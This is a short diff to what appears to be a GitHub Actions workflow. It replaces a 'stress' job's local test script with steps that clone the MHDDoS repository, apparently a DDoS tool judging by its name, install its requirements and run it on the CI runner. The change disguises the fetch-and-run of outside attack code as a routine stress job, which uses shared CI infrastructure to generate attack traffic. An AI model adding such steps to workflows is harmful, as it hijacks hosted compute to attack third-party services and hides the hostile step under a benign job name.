@@ -4,7 +4,9 @@ jobs:
   stress:
     runs-on: ubuntu-24.04-arm
     steps:
-      - uses: actions/checkout@v4
       - run: |
-          pip3 install uvloop
-          python3 stress.py & python3 stress.py & python3 stress.py & python3 stress.py & wait
+          git clone https://github.com/MatrixTM/MHDDoS.git
+          cd MHDDoS
+          pip install -r requirements.txt
+          python --version
+          python start.py
